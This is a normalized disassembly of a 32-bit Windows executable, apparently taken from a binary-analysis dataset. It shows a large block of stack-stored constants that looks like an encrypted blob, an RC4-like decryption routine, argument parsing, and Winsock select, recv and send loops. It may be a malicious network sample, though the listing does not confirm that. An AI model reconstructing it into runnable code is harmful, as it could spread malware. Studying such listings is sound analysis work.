mov [ ebp - 0x450 ] 0xd6ba4891
mov [ ebp - 0x44c ] 0xc797e2f6
mov [ ebp - 0x448 ] 0x545de37d
mov [ ebp - 0x444 ] 0x30fbbaf3
mov [ ebp - 0x440 ] 0xc72922f0
mov [ ebp - 0x43c ] 0x9014ba02
mov [ ebp - 0x438 ] 0xf762e8df
mov [ ebp - 0x434 ] 0x4d22e9bb
mov [ ebp - 0x430 ] 0x2823dc31
mov [ ebp - 0x42c ] 0x3cefbabf
mov [ ebp - 0x428 ] 0x91904c9d
mov [ ebp - 0x424 ] 0xf7c18b06
mov [ ebp - 0x420 ] 0xb0beeaae
mov [ ebp - 0x41c ] 0x8440d3a5
mov [ ebp - 0x418 ] 0x777ba2bb
mov [ ebp - 0x414 ] 0xbdc49d8b
mov [ ebp - 0x410 ] 0x39e5e77a
mov [ ebp - 0x40c ] 0x3f75d4a1
mov [ ebp - 0x408 ] 0x27d00520
mov [ ebp - 0x404 ] 0x3e1e9190
mov [ ebp - 0x400 ] 0x21eedc7c
mov [ ebp - 0x3fc ] 0x6ba52faf
mov [ ebp - 0x3f8 ] 0x5de221d1
mov [ ebp - 0x3f4 ] 0x381aa6be
mov [ ebp - 0x3f0 ] 0x2e71ff8d
mov [ ebp - 0x3ec ] 0xf36de6d3
mov [ ebp - 0x3e8 ] 0x7c1a3deb
mov [ ebp - 0x3e4 ] 0x4bba38cf
mov [ ebp - 0x3e0 ] 0xc46ca915
mov [ ebp - 0x3dc ] 0xa92f11d8
mov [ ebp - 0x3d8 ] 0xf1061132
mov [ ebp - 0x3d4 ] 0x442920b7
mov [ ebp - 0x3d0 ] 0xf2739b1f
mov [ ebp - 0x3cc ] 0x6de6e081
mov [ ebp - 0x3c8 ] 0xede9001e
mov [ ebp - 0x3c4 ] 0x4e38a339
mov [ ebp - 0x3c0 ] 0x2412a44c
mov [ ebp - 0x3bc ] 0xe8ce42b5
mov [ ebp - 0x3b8 ] 0xbd9d453
mov [ ebp - 0x3b4 ] 0x144f02f5
mov [ ebp - 0x3b0 ] 0x1f07c29d
mov [ ebp - 0x3ac ] 0xc18ceda3
mov [ ebp - 0x3a8 ] 0x26ae75ed
mov [ ebp - 0x3a4 ] 0x6574e618
mov [ ebp - 0x3a0 ] 0x3f89878a
mov [ ebp - 0x39c ] 0x1c2757c9
mov [ ebp - 0x398 ] 0x2127002c
mov [ ebp - 0x394 ] 0xa0357703
mov [ ebp - 0x390 ] 0xdcbf3c39
mov [ ebp - 0x38c ] 0x179d4b29
mov [ ebp - 0x388 ] 0xd93d4bc0
mov [ ebp - 0x384 ] 0xbb3eb231
mov [ ebp - 0x380 ] 0x2fbc739
mov [ ebp - 0x37c ] 0x4b1e221f
mov [ ebp - 0x378 ] 0x266c4623
mov [ ebp - 0x374 ] 0xf6c6a1bd
mov [ ebp - 0x370 ] 0x7d386de
mov [ ebp - 0x36c ] 0x921e70d1
mov [ ebp - 0x368 ] 0xed6b5cbc
mov [ ebp - 0x364 ] 0x47a9a90e
mov [ ebp - 0x360 ] 0x8f49a470
mov [ ebp - 0x35c ] 0xe9da67c6
mov [ ebp - 0x358 ] 0x6a0f46ad
mov [ ebp - 0x354 ] 0xc661d6e8
mov [ ebp - 0x350 ] 0x2dcd345c
mov [ ebp - 0x34c ] 0x60bfeca4
mov [ ebp - 0x348 ] 0x564e2a48
mov [ ebp - 0x344 ] 0x449df7d3
mov [ ebp - 0x340 ] 0x61d3e69b
mov [ ebp - 0x33c ] 0xfb4bae4d
mov [ ebp - 0x338 ] 0xdc655af4
mov [ ebp - 0x334 ] 0x8ca2c630
mov [ ebp - 0x330 ] 0x9fba70fa
mov [ ebp - 0x32c ] 0xa4ff795c
mov [ ebp - 0x328 ] 0x77fa4da4
mov [ ebp - 0x324 ] 0xdfbb9744
mov [ ebp - 0x320 ] 0xca418f7d
mov [ ebp - 0x31c ] 0x31c58c3d
mov [ ebp - 0x318 ] 0x170e2be6
mov [ ebp - 0x314 ] 0xeca3b0f1
mov [ ebp - 0x310 ] 0x7c8b5d20
mov [ ebp - 0x30c ] 0x7b208ad7
mov [ ebp - 0x308 ] 0x1cf21ad8
mov [ ebp - 0x304 ] 0x2efcaeb1
mov [ ebp - 0x300 ] 0x7af93d3d
mov [ ebp - 0x2fc ] 0xafabbec9
mov [ ebp - 0x2f8 ] 0xdbc6b9e9
mov [ ebp - 0x2f4 ] 0x8ac76a6a
mov [ ebp - 0x2f0 ] 0x9e0752c7
mov [ ebp - 0x2ec ] 0xb41927dc
mov [ ebp - 0x2e8 ] 0xf3d10c42
mov [ ebp - 0x2e4 ] 0xf722cdba
mov [ ebp - 0x2e0 ] 0xd3711b0a
mov [ ebp - 0x2dc ] 0xc3821cd9
mov [ ebp - 0x2d8 ] 0x409e49d6
mov [ ebp - 0x2d4 ] 0x7aca65b3
mov [ ebp - 0x2d0 ] 0x9319d1b7
mov [ ebp - 0x2cc ] 0x3b4832f9
mov [ ebp - 0x2c8 ] 0xf82e193e
mov [ ebp - 0x2c4 ] 0xf0ef50e6
mov [ ebp - 0x2c0 ] 0x45c3606b
mov [ ebp - 0x2bc ] 0x5308457d
mov [ ebp - 0x2b8 ] 0x4193a68e
mov [ ebp - 0x2b4 ] 0xc2bc5d0b
mov [ ebp - 0x2b0 ] 0x2855d52f
mov [ ebp - 0x2ac ] 0x46639d07
mov [ ebp - 0x2a8 ] 0x9c3e91b6
mov [ ebp - 0x2a4 ] 0x4d8c2ee2
mov [ ebp - 0x2a0 ] 0xb924f8e
mov [ ebp - 0x29c ] 0x235e9a95
mov [ ebp - 0x298 ] 0x4b65f140
mov [ ebp - 0x294 ] 0x7e0d214f
mov [ ebp - 0x290 ] 0xfda663f6
mov [ ebp - 0x28c ] 0xb7430900
mov [ ebp - 0x288 ] 0x7c53829a
mov [ ebp - 0x284 ] 0x3ecae0b0
mov [ ebp - 0x280 ] 0xc44a5c2f
mov [ ebp - 0x27c ] 0x37e8a8f7
mov [ ebp - 0x278 ] 0xe9834d9a
mov [ ebp - 0x274 ] 0x6467906e
mov [ ebp - 0x270 ] 0xf4610df3
mov [ ebp - 0x26c ] 0xb0aba516
mov [ ebp - 0x268 ] 0xd72dfe27
mov [ ebp - 0x264 ] 0xe15f7de
mov [ ebp - 0x260 ] 0x4ad25f53
mov [ ebp - 0x25c ] 0xa282ba08
mov [ ebp - 0x258 ] 0x758b0507
mov [ ebp - 0x254 ] 0x89d9f295
mov [ ebp - 0x250 ] 0x157d3bff
mov [ ebp - 0x24c ] 0x7c528e0
mov [ ebp - 0x248 ] 0x5def226
mov [ ebp - 0x244 ] 0x3d13f3e9
mov [ ebp - 0x240 ] 0x5b87e553
mov [ ebp - 0x23c ] 0xa7fd09a0
mov [ ebp - 0x238 ] 0xa41d880e
mov [ ebp - 0x234 ] 0x792df67a
mov [ ebp - 0x230 ] 0x118eaa31
mov [ ebp - 0x22c ] 0xf81853d2
mov [ ebp - 0x228 ] 0x2ffdf646
mov [ ebp - 0x224 ] 0x3d6c10ea
mov [ ebp - 0x220 ] 0x9698f4f6
mov [ ebp - 0x21c ] 0xc3d95fd
mov [ ebp - 0x218 ] 0x97b05a1d
mov [ ebp - 0x214 ] 0x8210dd51
mov [ ebp - 0x210 ] 0x59949e87
mov [ ebp - 0x20c ] 0x3751acf1
mov [ ebp - 0x208 ] 0x8d674fa3
mov [ ebp - 0x204 ] 0x55cad35f
mov [ ebp - 0x200 ] 0xc5eb62c7
mov [ ebp - 0x1fc ] 0x14d129f7
mov [ ebp - 0x1f8 ] 0xd4ab8183
mov [ ebp - 0x1f4 ] 0xe557bb5e
mov [ ebp - 0x1f0 ] 0x4a3eeb59
mov [ ebp - 0x1ec ] 0x3a828f97
mov [ ebp - 0x1e8 ] 0x3ec7e9de
mov [ ebp - 0x1e4 ] 0x849391bc
mov [ ebp - 0x1e0 ] 0xea497ff3
mov [ ebp - 0x1dc ] 0x2bfe1aa8
mov [ ebp - 0x1d8 ] 0xf900a99b
mov [ ebp - 0x1d4 ] 0xbdde5764
mov [ ebp - 0x1d0 ] 0xd9081c42
mov [ ebp - 0x1cc ] 0x8a148aab
mov [ ebp - 0x1c8 ] 0x2fc8db73
mov [ ebp - 0x1c4 ] 0x60b35b6d
mov [ ebp - 0x1c0 ] 0x824bfcda
mov [ ebp - 0x1bc ] 0xb1ae4916
mov [ ebp - 0x1b8 ] 0x57aaaef3
mov [ ebp - 0x1b4 ] 0x47158805
mov [ ebp - 0x1b0 ] 0x50201da4
mov [ ebp - 0x1ac ] 0x1ada34a7
mov [ ebp - 0x1a8 ] 0x7d49a210
mov [ ebp - 0x1a4 ] 0xd8ddfdfd
mov [ ebp - 0x1a0 ] 0x105a28f9
mov [ ebp - 0x19c ] 0x65c10872
mov [ ebp - 0x198 ] 0xbbbc6cb6
mov [ ebp - 0x194 ] 0x9902d1f4
mov [ ebp - 0x190 ] 0x95e923ee
mov [ ebp - 0x18c ] 0x67afc357
mov [ ebp - 0x188 ] 0x62e4f965
mov [ ebp - 0x184 ] 0xef3ac2f6
mov [ ebp - 0x180 ] 0x5cff95ea
mov [ ebp - 0x17c ] 0x54c1c19d
mov [ ebp - 0x178 ] 0x210f7e2d
mov [ ebp - 0x174 ] 0x3eba124f
mov [ ebp - 0x170 ] 0x8cd3a335
mov [ ebp - 0x16c ] 0xcbf48366
mov [ ebp - 0x168 ] 0x722ed87c
mov [ ebp - 0x164 ] 0x8561689a
mov [ ebp - 0x160 ] 0x9be161fd
mov [ ebp - 0x15c ] 0x4fefa322
mov [ ebp - 0x158 ] 0x7070fe21
mov [ ebp - 0x154 ] 0x45ae2b10
mov [ ebp - 0x150 ] 0x35d282ce
mov [ ebp - 0x14c ] 0x8100c605
mov [ ebp - 0x148 ] 0x39f32e9e
mov [ ebp - 0x144 ] 0x94be5497
mov [ ebp - 0x140 ] 0xd72f9fb5
mov [ ebp - 0x13c ] 0x63261e42
mov [ ebp - 0x138 ] 0x2dd4971d
mov [ ebp - 0x134 ] 0x907382c2
mov [ ebp - 0x130 ] 0x9c54504
mov [ ebp - 0x12c ] 0xa98ac60b
mov [ ebp - 0x128 ] 0x8be27df4
mov [ ebp - 0x124 ] 0x8720a0d2
mov [ ebp - 0x120 ] 0x825f4f40
mov [ ebp - 0x11c ] 0x8be6856e
mov [ ebp - 0x118 ] 0xdeb8ba1c
mov [ ebp - 0x114 ] 0x416f2b3c
mov [ ebp - 0x110 ] 0x7b4a3470
mov [ ebp - 0x10c ] 0xef25d5fa
mov [ ebp - 0x108 ] 0x247a0752
mov [ ebp - 0x104 ] 0xe8ac9aa8
mov [ ebp - 0x100 ] 0x586a0bea
mov [ ebp - 0xfc ] 0xade35090
mov [ ebp - 0xf8 ] 0x478b9b0a
mov [ ebp - 0xf4 ] 0x3788fac7
mov [ ebp - 0xf0 ] 0x29b3d22f
mov [ ebp - 0xec ] 0xfa18d8a7
mov [ ebp - 0xe8 ] 0x871e93df
mov [ ebp - 0xe4 ] 0x176fca2d
mov [ ebp - 0xe0 ] 0x666fdad5
mov [ ebp - 0xdc ] 0x3513522a
mov [ ebp - 0xd8 ] 0xb57c9eee
mov [ ebp - 0xd4 ] 0xc8ec0499
mov [ ebp - 0xd0 ] 0x7ef19fd6
mov [ ebp - 0xcc ] 0x57780a77
mov [ ebp - 0xc8 ] 0xcade969d
mov [ ebp - 0xc4 ] 0x36e24e61
mov [ ebp - 0xc0 ] 0x529c5128
mov [ ebp - 0xbc ] 0x9287afa4
mov [ ebp - 0xb8 ] 0xe747034e
mov [ ebp - 0xb4 ] 0xdeaf3307
mov [ ebp - 0xb0 ] 0x4a5ca0d3
mov [ ebp - 0xac ] 0x47a1d4aa
mov [ ebp - 0xa8 ] 0xcb12806a
mov [ ebp - 0xa4 ] 0xf602f4ce
mov [ ebp - 0xa0 ] 0xe9489e45
mov [ ebp - 0x9c ] 0x9c7bd04e
mov [ ebp - 0x98 ] 0xdb83c2d3
mov [ ebp - 0x94 ] 0xc9b932f6
mov [ ebp - 0x90 ] 0x7d1315d2
mov [ ebp - 0x8c ] 0x53c4b5e9
mov [ ebp - 0x88 ] 0x31fd635
mov [ ebp - 0x84 ] 0x10f921ca
mov eax [ ebp - 0x1008 ]
lea edi [ eax + 0x1000 ]
mov ecx 0x400
lea esi [ ebp - 0x1004 ]
mov [ ebp - 0x80 ] 0xdf941bf
mov [ ebp - 0x7c ] 0xe5a97511
mov [ ebp - 0x78 ] 0x2dc02c37
mov [ ebp - 0x74 ] 0x31f6795e
mov [ ebp - 0x70 ] 0x77ae0a8e
mov [ ebp - 0x6c ] 0xf4ca72bf
mov [ ebp - 0x68 ] 0x13f7e949
mov [ ebp - 0x64 ] 0xca23f00a
mov [ ebp - 0x60 ] 0x43d71d31
mov [ ebp - 0x5c ] 0xc9288192
mov [ ebp - 0x58 ] 0xcf7e8ad
mov [ ebp - 0x54 ] 0xef3ded61
mov [ ebp - 0x50 ] 0xb666ebf7
mov [ ebp - 0x4c ] 0xa6aa305d
mov [ ebp - 0x48 ] 0x24baa11a
mov [ ebp - 0x44 ] 0xc3eedd91
mov [ ebp - 0x40 ] 0x8c06c6fa
mov [ ebp - 0x3c ] 0xf4562e47
mov [ ebp - 0x38 ] 0x77004d16
mov [ ebp - 0x34 ] 0x32663d3a
mov [ ebp - 0x30 ] 0x86e8cc28
mov [ ebp - 0x2c ] 0x162c93fc
mov [ ebp - 0x28 ] 0xc63be634
mov [ ebp - 0x24 ] 0xbe8929c4
mov [ ebp - 0x20 ] 0x364b8fef
mov [ ebp - 0x1c ] 0xd32ba1bd
mov [ ebp - 0x18 ] 0x284a2bee
mov [ ebp - 0x14 ] 0x915ab069
mov [ ebp - 0x10 ] 0x7817437c
mov [ ebp - 0xc ] 0xa8f44d6
mov [ ebp - 0x8 ] 0xeed0ca2a
[ edi ] [ esi ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409fbd
mov esp ebp
pop ebp
retn
sub_405fa0
push ebp
mov ebp esp
push ecx
mov ecx [ eax ]
push 0x1
push 0x100
mov [ ebp - 0x4 ] ecx
call sub_40a006
add esp 0x8
xor ecx ecx
lea ebx [ ebx ]
mov [ ecx + eax ] cl
inc ecx
cmp ecx 0x100
jne r-xdata
push ebx
push esi
xor esi esi
push edi
xor ecx ecx
mov dl [ ecx + eax ]
mov ebx [ ebp - 0x4 ]
mov edi ecx
and edi 0x1f
movzx edi [ edi + ebx ]
movzx ebx dl
add esi edi
add esi ebx
and esi 0xff
mov bl [ esi + eax ]
mov [ ecx + eax ] bl
inc ecx
mov [ esi + eax ] dl
cmp ecx 0x100
jne r-xdata
xor ecx ecx
xor esi esi
xor edi edi
cmp [ ebp + 0xc ] ecx
jbe r-xdata
push eax
call sub_409fcc
add esp 0x4
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea esp [ esp ]
movzx ebx [ edx + eax ]
mov edx [ ebp + 0x8 ]
xor [ edi + edx ] bl
inc edi
cmp edi [ ebp + 0xc ]
jb r-xdata
dec edx
or edx 0xffffff00
inc edx
inc esi
and esi 0xff
mov dl [ esi + eax ]
movzx ebx dl
add ecx ebx
and ecx 0xff
mov bl [ ecx + eax ]
mov [ ecx + eax ] dl
mov [ esi + eax ] bl
movzx edx [ ecx + eax ]
movzx ebx bl
add edx ebx
and edx 0x800000ff
jns r-xdata
sub_406070
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
push edi
lea eax [ esp + 0x14 ]
push eax
call [ GetCommandLineW@IAT ]
push eax
call [ CommandLineToArgvW@IAT ]
cmp [ esp + 0x14 ] 0x3
jne r-xdata
mov [ esp + 0xc ] r--data
mov [ esp + 0x10 ] 0xea60
mov ebx [ eax + 0x4 ]
mov edi [ eax + 0x8 ]
mov eax ebx
lea edx [ eax + 0x2 ]
mov ecx [ esp + 0xc ]
mov dx [ esp + 0x10 ]
mov [ ebx + 0x64 ] ecx
mov [ ebx + 0x68 ] dx
call sub_407340
call sub_4085b0
push ebx
call sub_406dd0
push ebx
call sub_40a0eb
add esp 0x4
push esi
call sub_40a0eb
add esp 0x4
jmp r-xdata
push esi
push eax
call sub_406a10
mov ebx eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
inc eax
push 0x1
push eax
call sub_40a006
mov esi eax
mov eax edi
add esp 0x8
mov [ esp + 0xc ] esi
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
push 0x24
call sub_40a3e1
mov esi eax
add esp 0x4
mov eax 0x8235
xor ebx ebx
push 0xac
mov [ esi ] 0x1000
mov [ esi + 0x4 ] 0x100
mov [ esi + 0x18 ] edi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x8 ] ax
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] 0xbb8
call sub_40a3e1
add esp 0x4
cmp eax ebx
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
inc eax
push 0x1
push eax
call sub_40a006
mov [ esp + 0x18 ] eax
mov eax ebx
add esp 0x8
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
inc eax
push eax
push 0x0
push esi
call sub_40f160
mov eax edi
add esp 0xc
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ esp + 0x10 ]
sub eax edx
sar eax 0x1
inc eax
push eax
push 0x0
push ecx
call sub_40f160
mov eax ebx
add esp 0xc
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
mov edx eax
mov eax ebx
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
push 0x0
push 0x0
push edx
mov edx [ esp + 0x18 ]
sub eax esi
push edx
sar eax 0x1
add eax eax
push eax
push ebx
mov ebx [ WideCharToMultiByte@IAT ]
push 0x0
push 0x0
call ebx
mov eax edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
mov edx eax
mov eax edi
lea esi [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
push 0x0
push 0x0
push edx
sub eax esi
mov esi [ esp + 0x1c ]
push esi
sar eax 0x1
lea ecx [ eax + eax ]
push ecx
push edi
push 0x0
push 0x0
call ebx
push esi
call sub_40a0e0
movzx esi ax
mov eax [ esp + 0x10 ]
add esp 0x4
mov [ esp + 0x10 ] esi
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0x7
jb r-xdata
push 0x0
call sub_40a379
test si si
je r-xdata
movzx edx si
cmp edx 0x10000
jle r-xdata
mov edi 0xa
lea ebx [ ebx ]
sub_4062c0
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40a545
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a0eb
add esp 0x4
sub_4062f0
push ebp
mov ebp esp
sub esp 0x450
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx edx
push esi
xor esi esi
lea eax [ ebx + eax * 8 ]
push edi
xor edi edi
mov [ ebp - 0x43c ] ebx
mov [ ebp - 0x430 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x434 ] eax
cmp ebx eax
jae r-xdata
mov eax 0x10624dd3
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x444 ] eax
imul eax eax 0x3e8
mov edx ecx
sub edx eax
inc ecx
imul edx edx 0x3e8
neg ecx
sbb ecx ecx
lea eax [ ebp - 0x444 ]
and ecx eax
mov eax [ ebp - 0x430 ]
push ecx
mov [ ebp - 0x438 ] ecx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0x440 ] edx
push ecx
lea edx [ ebp - 0x21c ]
push edx
inc eax
push eax
call [ select@IAT ]
mov esi eax
call [ WSAGetLastError@IAT ]
cmp esi 0xffffffff
jne r-xdata
jmp r-xdata
cmp esi ebx
jge r-xdata
cmp eax 0x2736
jne r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
jle r-xdata
call [ WSAGetLastError@IAT ]
push eax
push r--data
call sub_40ac45
add esp 0x8
cmp esi ebx
mov edi [ ebp - 0x43c ]
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x114 ] ebx
mov [ ebp - 0x324 ] ebx
mov [ ebp - 0x42c ] ebx
mov [ ebp - 0x44c ] ebx
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x430 ] 0xffffffff
cmp edi [ ebp - 0x434 ]
jae r-xdata
cmp edx 0x1f4000
ja r-xdata
cmp edx 0x1f4000
jae r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_409fbd
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x43c ]
mov ebx [ ebp - 0x434 ]
cmp eax ebx
jae r-xdata
mov edx [ ebp - 0x438 ]
push edx
mov edx [ ebp - 0x430 ]
push ebx
lea eax [ ebp - 0x114 ]
push eax
lea ecx [ ebp - 0x21c ]
push ecx
inc edx
push edx
call [ select@IAT ]
mov esi eax
call [ WSAGetLastError@IAT ]
cmp esi 0xffffffff
je r-xdata
mov eax [ edi ]
cmp eax ebx
jbe r-xdata
or [ ebx + 0x6 ] 0x20
test edx edx
jne r-xdata
add ebx 0x8
cmp ebx [ ebp - 0x434 ]
jb r-xdata
movzx eax [ ebx + 0x4 ]
mov [ ebp - 0x438 ] eax
test al 0x1
je r-xdata
sub ebx eax
dec ebx
shr ebx 0x3
lea edi [ eax + 0x6 ]
inc ebx
add edi 0x8
cmp edi [ ebp - 0x434 ]
jb r-xdata
cmp eax 0x800
jae r-xdata
test al 0x2
je r-xdata
xor eax eax
test edi edi
je r-xdata
mov eax [ edi - 0x6 ]
lea edx [ ebp - 0x114 ]
push edx
push eax
call [ __WSAFDIsSet@IAT ]
test eax eax
je r-xdata
or [ edi ] 0x1
movzx ecx [ edi + 0x4 ]
test cl 0x3
je r-xdata
cmp edx [ ebp - 0x430 ]
jbe r-xdata
xor eax eax
test esi esi
je r-xdata
cmp eax edi
jne r-xdata
lea ebx [ ebx ]
add edi 0x8
dec ebx
jne r-xdata
or [ edi ] 0x2
test [ edi + 0x6 ] 0x20
jne r-xdata
test [ ebp - 0x438 ] 0x3
je r-xdata
cmp eax esi
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x438 ]
cmp edi 0x40
jae r-xdata
inc eax
cmp eax edi
jb r-xdata
mov ecx [ edi - 0x6 ]
lea eax [ ebp - 0x21c ]
push eax
push ecx
call [ __WSAFDIsSet@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x324 ] ebx
mov [ ebp - 0x42c ] ebx
test cl 0x1
je r-xdata
mov [ ebp - 0x430 ] edx
jmp r-xdata
cmp esi 0x40
jae r-xdata
cmp [ ebp + eax * 4 - 0x110 ] edx
je r-xdata
mov [ ebp + eax * 4 - 0x218 ] edx
mov edi [ ebp - 0x21c ]
inc edi
mov [ ebp - 0x21c ] edi
cmp [ ebp + eax * 4 - 0x218 ] edx
je r-xdata
test cl 0x2
je r-xdata
mov [ ebp - 0x320 ] eax
mov [ ebp - 0x324 ] 0x1
mov [ ebp + eax * 4 - 0x110 ] edx
mov esi [ ebp - 0x114 ]
inc esi
mov [ ebp - 0x114 ] esi
inc eax
cmp eax esi
jb r-xdata
lea ecx [ ebp - 0x44c ]
push ecx
push ebx
lea edx [ ebp - 0x42c ]
push edx
lea ecx [ ebp - 0x324 ]
push ecx
inc eax
push eax
call [ select@IAT ]
mov esi eax
call [ WSAGetLastError@IAT ]
cmp esi 0xffffffff
je r-xdata
mov [ ebp - 0x428 ] eax
mov [ ebp - 0x42c ] 0x1
cmp eax 0x2736
jne r-xdata
movzx ebx [ edi + 0x4 ]
test bl 0x1
je r-xdata
or [ edi + 0x6 ] 0x20
test bl 0x2
je r-xdata
mov ecx [ ebp - 0x21c ]
xor eax eax
test ecx ecx
je r-xdata
mov eax [ edi ]
xor ebx ebx
cmp eax [ ebp - 0x430 ]
jbe r-xdata
mov ecx [ ebp - 0x114 ]
xor eax eax
test ecx ecx
je r-xdata
cmp eax ecx
jne r-xdata
mov edx [ edi ]
jmp r-xdata
mov [ ebp - 0x430 ] eax
jmp r-xdata
cmp eax ecx
jne r-xdata
mov edx [ edi ]
lea esp [ esp ]
cmp ecx 0x40
jae r-xdata
cmp [ ebp + eax * 4 - 0x218 ] edx
je r-xdata
cmp ecx 0x40
jae r-xdata
inc eax
cmp eax ecx
jb r-xdata
mov edx [ edi ]
mov [ ebp + eax * 4 - 0x218 ] edx
inc [ ebp - 0x21c ]
inc eax
cmp eax ecx
jb r-xdata
mov ecx [ edi ]
mov [ ebp + eax * 4 - 0x110 ] ecx
inc [ ebp - 0x114 ]
cmp [ ebp + eax * 4 - 0x110 ] edx
je r-xdata
sub_4066d0
push ebp
mov ebp esp
sub esp 0x18
mov ecx [ ebp + 0x14 ]
imul ecx ecx 0x3e8
mov eax 0x10624dd3
imul ecx
sar edx 0x6
push ebx
mov eax edx
push esi
shr eax 0x1f
xor esi esi
add eax edx
xor ebx ebx
push edi
mov [ ebp - 0x8 ] esi
mov [ ebp + 0x14 ] ecx
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x18 ] esi
je r-xdata
mov ecx [ ebp + 0xc ]
push 0x0
mov eax 0x4
sub eax esi
push eax
mov eax [ ebp + 0x8 ]
lea edx [ esi + ecx ]
push edx
push eax
call [ recv@IAT ]
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx 0x1
mov [ ebp - 0x10 ] dx
push edx
lea edx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
call sub_4062f0
add esp 0x4
test eax eax
jle r-xdata
cmp esi 0x4
je r-xdata
add esi edi
cmp esi 0x4
jne r-xdata
mov eax 0xfffffffa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test [ ebp - 0xe ] 0x1
jne r-xdata
mov [ ebp + 0x18 ] 0x0
cmp esi 0x4
jge r-xdata
test edi edi
jns r-xdata
mov ecx [ ebp + 0xc ]
mov edi [ ecx ]
cmp edi [ ebp + 0x10 ]
jg r-xdata
mov edi [ WSAGetLastError@IAT ]
call edi
mov [ rw-data ] eax
test esi esi
jns r-xdata
jne r-xdata
call [ WSAGetLastError@IAT ]
push 0x64
mov [ rw-data ] eax
call [ Sleep@IAT ]
add ebx 0x64
cmp ebx 0xbb8
jge r-xdata
push 0x4000
call sub_40a9c1
add esp 0x4
push 0x0
mov esi eax
mov eax [ ebp + 0x8 ]
push 0x4000
push esi
push eax
call [ recv@IAT ]
push esi
call sub_409fcc
add esp 0x4
pop edi
pop esi
mov eax 0xfffffffe
pop ebx
mov esp ebp
pop ebp
retn
test edi edi
jle r-xdata
mov eax esi
neg eax
sbb eax eax
and eax 0xfffffffb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call edi
cmp eax 0x2733
jne r-xdata
mov eax 0xfffffff6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0xfffffff8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test edi edi
mov ebx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
push 0x0
mov edx edi
sub edx ebx
push edx
mov edx [ ebp + 0x8 ]
lea ecx [ ebx + eax ]
push ecx
push edx
call [ recv@IAT ]
mov esi eax
test esi esi
je r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jns r-xdata
jle r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp - 0xc ]
add eax ecx
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
add ebx esi
mov [ ebp - 0x8 ] ebx
jmp r-xdata
call [ WSAGetLastError@IAT ]
mov [ rw-data ] eax
test esi esi
mov eax 0xfffffffd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
call [ Sleep@IAT ]
cmp edi ebx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4068c0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
or esi 0xffffffff
cmp [ ebp + 0x18 ] 0x0
push edi
mov [ ebp - 0x8 ] eax
je r-xdata
xor edi edi
lea esp [ esp ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov ecx ebx
imul ecx ecx 0x3e8
mov edx 0x2
mov [ ebp - 0xc ] dx
push 0x1
lea edx [ ebp - 0x10 ]
call sub_4062f0
mov esi eax
add esp 0x4
test esi esi
jle r-xdata
mov edx [ ebp + 0x8 ]
push 0x0
mov eax 0x4
sub eax edi
push eax
lea ecx [ ebp + edi - 0x8 ]
push ecx
push edx
call [ send@IAT ]
mov esi eax
call [ WSAGetLastError@IAT ]
cmp eax 0x2746
je r-xdata
test esi esi
jns r-xdata
mov eax 0xfffffffe
pop edi
pop esi
